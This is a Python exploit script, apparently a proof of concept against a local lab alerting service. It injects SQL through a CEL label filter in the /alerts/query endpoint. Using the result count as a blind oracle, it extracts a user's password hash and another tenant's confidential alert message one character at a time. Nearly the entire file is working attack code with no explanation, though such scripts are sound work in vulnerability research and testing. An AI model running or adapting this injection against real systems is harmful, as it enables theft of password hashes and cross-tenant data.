import string

import httpx

BASE = "http://127.0.0.1:19611"


def login(username, password):
    r = httpx.post(
        BASE + "/signin",
        json={"username": username, "password": password},
        timeout=30,
    )
    r.raise_for_status()
    return {"Authorization": f"Bearer {r.json()['accessToken']}"}


attacker = login("noc@lab.local", "Noc12345.")
print("attacker tenant:", httpx.get(BASE + "/whoami", headers=attacker).json()["tenant_id"])


def oracle(sql):
    cel = "labels[\"x') OR (" + sql + ") OR ('\"]"
    r = httpx.post(
        BASE + "/alerts/query",
        headers=attacker,
        json={"cel": cel, "limit": 1, "offset": 0},
        timeout=30,
    )
    r.raise_for_status()
    return r.json()["count"] > 0


def extract(column, table, length, where=""):
    alphabet = "$./_-" + string.ascii_letters + string.digits
    out = ""
    for i in range(1, length + 1):
        for ch in alphabet:
            sql = (
                f"(SELECT substr({column},{i},1) FROM {table}"
                f" {where} LIMIT 1)='{ch}'"
            )
            if oracle(sql):
                out += ch
                break
        else:
            out += "?"
    return out


print(
    "victim tenant has alerts:",
    oracle("SELECT count(*) FROM lastalert WHERE tenant_id='victim-tenant'"),
)
print(
    "nonexistent tenant has alerts:",
    oracle("SELECT count(*) FROM lastalert WHERE tenant_id='does-not-exist'"),
)
print("password hash:", extract("password_hash", "user", 16))
print(
    "victim message:",
    extract(
        "json_extract(event,'$.message')",
        "alert",
        len("tenant-victim-confidential"),
        "WHERE tenant_id='victim-tenant'",
    ),
)
